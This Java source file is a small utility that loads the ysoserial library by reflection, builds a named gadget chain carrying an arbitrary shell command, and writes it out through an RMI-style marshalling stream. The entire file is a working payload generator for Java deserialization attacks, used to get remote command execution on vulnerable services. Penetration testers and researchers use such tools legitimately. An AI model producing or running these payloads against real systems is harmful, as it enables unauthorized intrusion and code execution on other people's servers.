import java.io.*;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class GadgetMarshaller {
    public static void main(String[] args) throws Exception {
        final String ysoserial_path;
        final String gadgetName;
        final String cmd;
        final String outFile;

        if (args.length < 3) {
            System.out.println("Usage: java GadgetMarshaller /path/to/ysoserial.jar Gadget1 cmd (optional)/path/to/output/file");
            return;
        } else {
            ysoserial_path = args[0];
            gadgetName = args[1];
            cmd = args[2];
            outFile = args.length >= 4 ? args[3] : null;
        }

        if (!new File(ysoserial_path).exists()) {
            System.out.printf("Error: Ysoserial path \"%s\" does not exist.\n", ysoserial_path);
            return;
        }

        URLClassLoader ysoserialLoader = new URLClassLoader(new URL[] {new File(ysoserial_path).toURI().toURL()}, GadgetMarshaller.class.getClassLoader());

        Class<?> objectPayloadUtilsClazz = Class.forName("ysoserial.payloads.ObjectPayload$Utils", true, ysoserialLoader);
        Method getPayloadClassMethod = objectPayloadUtilsClazz.getDeclaredMethod("getPayloadClass", String.class);
        Class<?> gadgetClazz = (Class<?>) getPayloadClassMethod.invoke(null, gadgetName);

        Class<?> objectPayloadClazz = Class.forName("ysoserial.payloads.ObjectPayload", true, ysoserialLoader);
        Method getObjectMethod = objectPayloadClazz.getDeclaredMethod("getObject", String.class);
        Object gadget = getObjectMethod.invoke(gadgetClazz.getDeclaredConstructor().newInstance(), cmd);

        MarshalOutputStream mos;
        try {
            mos = new MarshalOutputStream((outFile == null) ? System.out : new FileOutputStream(outFile));
            mos.writeObject(gadget);
            mos.flush();
            mos.close();
        } catch (FileNotFoundException e) {
            System.out.println("Error: output file path was not found.");
        }
    }
    static final class MarshalOutputStream extends ObjectOutputStream {
        MarshalOutputStream(OutputStream out) throws IOException {
            super(out);
        }
        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            writeObject(null);
        }
        @Override
        protected void annotateProxyClass(Class<?> cl) throws IOException {
            annotateClass(cl);
        }
    }
}
